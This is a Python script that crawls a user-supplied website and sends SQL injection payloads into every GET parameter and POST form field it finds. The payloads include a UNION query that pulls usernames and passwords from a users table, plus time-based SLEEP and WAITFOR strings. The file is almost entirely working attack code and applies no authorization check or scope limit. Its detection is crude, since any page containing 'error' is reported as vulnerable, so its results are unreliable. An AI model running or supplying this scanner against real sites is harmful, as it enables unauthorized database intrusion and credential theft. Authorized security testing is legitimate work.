import requests
from bs4 import BeautifulSoup
from termcolor import colored
from urllib.parse import urlparse, urljoin, parse_qs, urlencode

# SQL Injection payloads for different types of attacks
sql_payloads = {
    'error_based': ["'", "' OR '1'='1' --", "' OR '1'='2' --", "' OR '1'='0' --"],
    'union_based': ["' UNION SELECT NULL --", "' UNION SELECT username, password FROM users --"],
    'boolean_based': ["' AND '1'='1' --", "' AND '1'='2' --"],
    'time_based': ["' OR SLEEP(5) --", "'; WAITFOR DELAY '0:0:5' --"]
}

# Function to find all internal links on a webpage
def find_internal_links(url, domain):
    internal_links = set()
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for bad responses
        soup = BeautifulSoup(response.content, 'html.parser')
        
        for link in soup.find_all('a', href=True):
            href = link.get('href')
            full_url = urljoin(url, href)  # Handle relative URLs
            parsed_full_url = urlparse(full_url)

            # Only add internal links (same domain)
            if parsed_full_url.netloc == domain:
                internal_links.add(full_url)

    except requests.RequestException as e:
        print(colored(f"Error while crawling {url}: {str(e)}", "red"))

    return internal_links

# Function to test SQL Injection on GET request
def test_get_method(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    for param in params.keys():
        for attack_type, payloads in sql_payloads.items():
            for payload in payloads:
                # Create a new URL with the SQL payload injected
                sql_params = params.copy()
                sql_params[param] = payload
                sql_url = parsed_url._replace(query=urlencode(sql_params, doseq=True)).geturl()

                try:
                    response = requests.get(sql_url)
                    if "SQL" in response.text or "error" in response.text:
                        print(colored(f"SQL Injection found on GET method at URL: {sql_url}", "green"))
                        print(colored(f"Type: {attack_type.capitalize()}, Parameter: {param}, Payload: {payload}", "green"))
                except requests.RequestException as e:
                    print(colored(f"Error while testing {sql_url}: {str(e)}", "red"))

# Function to test SQL Injection on POST request
def test_post_method(url, data):
    for param in data.keys():
        for attack_type, payloads in sql_payloads.items():
            for payload in payloads:
                # Create a new payload for the POST body
                sql_data = data.copy()
                sql_data[param] = payload

                try:
                    response = requests.post(url, data=sql_data)
                    if "SQL" in response.text or "error" in response.text:
                        print(colored(f"SQL Injection found on POST method at URL: {url}", "green"))
                        print(colored(f"Type: {attack_type.capitalize()}, Parameter: {param}, Payload: {payload}", "green"))
                except requests.RequestException as e:
                    print(colored(f"Error while testing {url}: {str(e)}", "red"))

# Function to crawl the website and test for SQL Injection vulnerabilities
def crawl_and_test(url):
    domain = urlparse(url).netloc
    visited_links = set()

    def crawl(url):
        if url in visited_links:
            return  # Avoid re-visiting the same page
        visited_links.add(url)

        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')

            # Test SQL Injection for GET parameters
            test_get_method(url)

            # Find all forms to test POST requests
            forms = soup.find_all('form')
            for form in forms:
                form_method = form.get('method', 'get').lower()
                form_action = form.get('action')
                if not form_action.startswith('http'):
                    form_action = urljoin(url, form_action)  # Handle relative form action URLs
                    
                inputs = form.find_all('input')
                params = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs}

                # Test SQL Injection for POST methods
                if form_method == "post":
                    test_post_method(form_action, params)

            # Find and crawl internal links
            internal_links = find_internal_links(url, domain)
            for link in internal_links:
                crawl(link)

        except requests.RequestException as e:
            print(colored(f"Error while crawling {url}: {str(e)}", "red"))

    crawl(url)

# Main function
if __name__ == "__main__":
    website_url = input(colored("Enter the URL to scan for SQL Injection: ", "cyan"))
    
    # Start scanning for SQL Injection vulnerabilities
    crawl_and_test(website_url)
